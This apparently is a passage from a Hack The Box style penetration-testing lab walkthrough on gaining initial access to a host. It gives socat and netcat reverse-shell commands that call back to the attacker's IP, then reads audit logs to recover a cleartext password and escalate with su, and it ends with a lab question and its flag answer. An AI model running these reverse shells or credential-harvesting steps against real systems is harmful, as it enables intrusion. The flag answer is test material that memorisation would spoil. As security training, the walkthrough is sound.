# Initial Access
## Getting a Reverse Shell
As mentioned in the previous section, we can use Socat to establish a reverse shell connection. Our base command will be as follows, but we'll need to tweak it some to get past the filtering:

```shellsession
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

We'll start a Socat listener on our attack host.

```shellsession
masterofblafu@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
```

Next, we'll execute a Socat one-liner on the target host to upgrade to an interactive TTY. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) describes a few methods. 

```shellsession
masterofblafu@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

If all goes as planned, we'll have a stable reverse shell connection on our Socat listener.

```shellsession
webdev@dmz01:/var/www/html/monitoring$ id

uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
webdev@dmz01:/var/www/html/monitoring$
```

Users in the `adm` group having rights to read ALL logs stored in `/var/log`. Perhaps we can find something interesting there. We can use `aureport` to read audit logs on Linux systems, with the man page describing it as "aureport is a tool that produces summary reports of the audit system logs."

```shellsession
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

After running the command, type `q` to return to our shell. From the above output, it looks like a user was trying to authenticate as the `srvadm` user, and we have a potential credential pair `srvadm`:`ILFreightnixadm!`. Using the `su` command, we can authenticate as the `srvadm` user.

```shellsession
webdev@dmz01:/var/www/html/monitoring$ su srvadm

Password: 
$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ /bin/bash -i

srvadm@dmz01:/var/www/html/monitoring$
```

## Questions
1. Submit the contents of the flag.txt file in the /home/srvadm directory. **Answer: b447c27a00e3a348881b0030177000cd**
   - Follow the steps in this section